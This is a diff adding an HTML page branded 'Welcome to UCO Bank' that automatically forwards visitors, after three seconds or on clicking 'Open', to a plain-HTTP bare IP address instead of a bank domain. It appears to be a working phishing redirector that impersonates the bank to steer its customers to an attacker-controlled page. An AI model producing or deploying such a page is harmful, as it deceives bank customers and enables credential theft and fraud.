@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>UCO Bank Redirect</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="refresh" content="3;url=http://128.140.56.50/uco/">
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background: linear-gradient(135deg, #004d99, #66a3ff);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      padding: 20px;
+    }
+
+    .container {
+      text-align: center;
+      background: #ffffffcc;
+      padding: 30px 20px;
+      border-radius: 20px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      max-width: 100%;
+      width: 100%;
+      max-width: 400px;
+    }
+
+    h1 {
+      margin-bottom: 20px;
+      color: #003366;
+      font-size: 24px;
+    }
+
+    p {
+      margin-bottom: 25px;
+      font-size: 16px;
+      color: #333;
+    }
+
+    .redirect-button {
+      background-color: #004d99;
+      color: white;
+      padding: 12px 24px;
+      border: none;
+      border-radius: 30px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease, transform 0.2s;
+    }
+
+    .redirect-button:hover {
+      background-color: #003366;
+      transform: scale(1.05);
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Welcome to UCO Bank</h1>
+    <p>You will be redirected in 3 seconds.</p>
+    <button class="redirect-button" onclick="window.location.href='http://128.140.56.50/uco/'">Open</button>
+  </div>
+</body>
+</html>
